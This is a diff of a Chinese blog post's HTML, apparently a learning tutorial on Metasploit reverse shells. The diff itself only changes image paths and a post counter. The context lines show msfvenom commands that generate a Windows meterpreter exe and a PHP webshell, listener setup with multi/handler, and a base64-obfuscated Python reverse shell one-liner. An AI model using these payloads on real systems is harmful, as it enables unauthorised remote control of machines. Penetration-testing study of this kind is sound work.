@@ -445,9 +445,9 @@
 <p><strong>反向shell:</strong>被攻击者主动连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况。(攻击者&lt;-被攻击者)</p>
 <p><strong>nc</strong>可以实现一个很简单的正向与反向shell连接的示例：</p>
 <p>正向</p>
-<p><img src="1208761-20190108155228561-656308830.png" alt=""></p>
+<p><img src="/2020/04/27/msf-fan-dan-payload-xue-xi/1208761-20190108155228561-656308830.png" alt></p>
 <p>反向</p>
-<p><img src="1208761-20190108140558839-392665606.png" alt=""></p>
+<p><img src="/2020/04/27/msf-fan-dan-payload-xue-xi/1208761-20190108140558839-392665606.png" alt></p>
 <p>对于实际的渗透测试过程来说，我们常常使用的往往是反弹shell的方式来突破边界防火墙的限制。</p>
 <p><strong>下面列举了一些使用反向shell的情况：</strong></p>
 <ul>
@@ -457,7 +457,7 @@
 <li>你还不能确定应该选择反向 Shell 还是正向 Shell 的时候</li>
 </ul>
 <h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><p>​        msfvenom是msfpayload,msfencode的结合体，可利用msfvenom生成木马程序,并在目标机上执行,在本地监听上线。Msfvenom 在 2015 年 6 月 8 日已经替代了 msfpayload 与 msfenocde 命令，它是这两个命令的结合体。为了开始使用 msfvenom，可以首先浏览一下它所支持的命令参数：</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200427142626.png" alt=""></p>
+<p><img src="/2020/04/27/msf-fan-dan-payload-xue-xi/QQ%E6%88%AA%E5%9B%BE20200427142626.png" alt></p>
 <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Options:</span><br><span class="line">    -p, <span class="comment">--payload       &lt;payload&gt;    Payload to use. Specify a '-' or stdin to use custom payloads # 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取</span></span><br><span class="line">        <span class="comment">--payload-options            List the payload's standard options # 列出指定 Payload 的标准可选配置项</span></span><br><span class="line">    -l, <span class="comment">--list          [type]       List a module type. Options are: payloads, encoders, nops, all # 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, all</span></span><br><span class="line">    -n, <span class="comment">--nopsled       &lt;length&gt;     Prepend a nopsled of [length] size on to the payload # 指定 nop 在 payload 中的数量（译者注：类似堆喷射中通过 nop 滑动到 payload）</span></span><br><span class="line">    -f, <span class="comment">--format        &lt;format&gt;     Output format (use --help-formats for a list) # 指定 Payload 的输出格式</span></span><br><span class="line">        <span class="comment">--help-formats               List available formats # 列出所有可用的输出格式</span></span><br><span class="line">    -e, <span class="comment">--encoder       &lt;encoder&gt;    The encoder to use # 指定使用的 Encoder</span></span><br><span class="line">    -a, <span class="comment">--arch          &lt;arch&gt;       The architecture to use # 指定目标系统架构</span></span><br><span class="line">        <span class="comment">--platform      &lt;platform&gt;   The platform of the payload # 指定目标系统平台</span></span><br><span class="line">        <span class="comment">--help-platforms             List available platforms # 列出可用的平台</span></span><br><span class="line">    -s, <span class="comment">--space         &lt;length&gt;     The maximum size of the resulting payload # 设置未经编码的 Payload 的最大长度</span></span><br><span class="line">        <span class="comment">--encoder-space &lt;length&gt;     The maximum size of the encoded payload (defaults to the -s value) # 编码后的 Payload 的最大长度</span></span><br><span class="line">    -b, <span class="comment">--bad-chars     &lt;list&gt;       The list of characters to avoid example: '\x00\xff' # 设置需要在 Payload 中避免出现的字符</span></span><br><span class="line">    -i, <span class="comment">--iterations    &lt;count&gt;      The number of times to encode the payload # 设置 Payload 的编码次数</span></span><br><span class="line">    -c, <span class="comment">--add-code      &lt;path&gt;       Specify an additional win32 shellcode file to include # 指定包含一个额外的win32 shellcode文件</span></span><br><span class="line">    -x, <span class="comment">--template      &lt;path&gt;       Specify a custom executable file to use as a template # 指定一个特定的可执行文件作为模板</span></span><br><span class="line">    -k, <span class="comment">--keep                       Preserve the template behavior and inject the payload as a new thread # 保护模板程序的功能，注入的payload作为一个新的进程运行</span></span><br><span class="line">    -o, <span class="comment">--out           &lt;path&gt;       Save the payload # 保存 Payload 到文件</span></span><br><span class="line">    -v, <span class="comment">--var-name      &lt;name&gt;       Specify a custom variable name to use for certain output formats # 指定一个变量名</span></span><br><span class="line">（译者注：当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）</span><br><span class="line">        <span class="comment">--smallest                   Generate the smallest possible payload # 尽可能生成最短的 Payload</span></span><br><span class="line">    -h, <span class="comment">--help                       Show this message # 帮助</span></span><br></pre></td></tr></table></figure>
 
 <p>我们可以通过命令列出可用的payloads、encoders、nops。</p>
@@ -476,12 +476,12 @@
 <p>靶机: win7   192.168.153.160</p>
 <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.153</span><span class="number">.176</span> LPORT=<span class="number">5555</span> -f exe -o payload.exe</span><br></pre></td></tr></table></figure>
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200427153433.png" alt=""></p>
+<p><img src="/2020/04/27/msf-fan-dan-payload-xue-xi/QQ%E6%88%AA%E5%9B%BE20200427153433.png" alt></p>
 <p>复制shell.exe到Windows机器，然后kali下开启msf使用如下命令监听4444端口：</p>
 <figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msfconsole    <span class="comment">//启动msf</span></span><br><span class="line"></span><br><span class="line">use exploit/multi/handler          <span class="comment">//使用msf的侦听模块exploit/multi/handler</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> PAYLOAD <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_tcp</span>        //设置载荷<span class="comment">payload</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">set</span> <span class="comment">LHOST 192.168.153.176</span>               //设置本地监听机<span class="comment">Ip</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LPORT  4444</span>              //设置监听端口</span><br><span class="line">     </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
 <p>执行完之后在Windows下执行payload.exe，然后结果如图：</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200427153539.png" alt=""></p>
+<p><img src="/2020/04/27/msf-fan-dan-payload-xue-xi/QQ%E6%88%AA%E5%9B%BE20200427153539.png" alt></p>
 <p>在这里既然使用到了在Windows下执行应用程序，我们就大概盘点一下在Windows执行应用程序的几种方式：</p>
 <ul>
 <li>双击运行</li>
@@ -512,14 +512,14 @@
 <h4 id="如何利用-1"><a href="#如何利用-1" class="headerlink" title="如何利用"></a>如何利用</h4><p>下面以php为例做一下测试，使用以下命令生成一个webshell：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.88</span><span class="number">.128</span> LPORT=<span class="number">4444</span> -f raw &gt; shell.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200427151118.png" alt=""></p>
+<p><img src="/2020/04/27/msf-fan-dan-payload-xue-xi/QQ%E6%88%AA%E5%9B%BE20200427151118.png" alt></p>
 <p>在kali上使用msf执行下面的命令，监听端口4444：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">    </span><br><span class="line">use exploit/multi/handler </span><br><span class="line">    </span><br><span class="line">set PAYLOAD php/meterpreter_reverse_tcp </span><br><span class="line">    </span><br><span class="line">set LHOST <span class="number">192.168</span><span class="number">.153</span><span class="number">.176</span></span><br><span class="line">    </span><br><span class="line">set LPORT  <span class="number">4444</span> </span><br><span class="line">    </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
 <p>将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200427152102.png" alt=""></p>
+<p><img src="/2020/04/27/msf-fan-dan-payload-xue-xi/QQ%E6%88%AA%E5%9B%BE20200427152102.png" alt></p>
 <h4 id="脚本shell"><a href="#脚本shell" class="headerlink" title="脚本shell"></a>脚本shell</h4><p>关于使用脚本反弹shell的方式，主要以python、bash、perl为例。</p>
 <p>这种反弹方式也叫做<strong>git解释性脚本语言反弹shell</strong></p>
 <h5 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>
@@ -537,9 +537,9 @@
 <p>然后复制shell.py中的内容在linux命令行下执行，如下：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ=='.decode('base64'))"</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200427150606.png" alt=""></p>
+<p><img src="/2020/04/27/msf-fan-dan-payload-xue-xi/QQ%E6%88%AA%E5%9B%BE20200427150606.png" alt></p>
 <p>结果如图：</p>
-<p><img src="QQ%E6%88%AA%E5%9B%BE20200427150633.png" alt=""></p>
+<p><img src="/2020/04/27/msf-fan-dan-payload-xue-xi/QQ%E6%88%AA%E5%9B%BE20200427150633.png" alt></p>
 <h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://xz.aliyun.com/t/2380" target="_blank" rel="noopener">https://xz.aliyun.com/t/2380</a></p>
 <p><a href="https://blog.51cto.com/13539934/2113551" target="_blank" rel="noopener">https://blog.51cto.com/13539934/2113551</a></p>
 <p>[<a href="https://www.sariel.top/2019/08/19/Linux/kali/msfconsole/msfvenom/msfvenom%E5%90%8E%E9%97%A8%E5%AD%A6%E4%B9%A0-windows%E7%AF%87/#o-%E6%96%87%E4%BB%B6%E8%BE%93%E5%87%BA]" target="_blank" rel="noopener">https://www.sariel.top/2019/08/19/Linux/kali/msfconsole/msfvenom/msfvenom%E5%90%8E%E9%97%A8%E5%AD%A6%E4%B9%A0-windows%E7%AF%87/#o-%E6%96%87%E4%BB%B6%E8%BE%93%E5%87%BA]</a>(</p>
@@ -666,7 +666,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">64</span>
+                  <span class="site-state-item-count">66</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
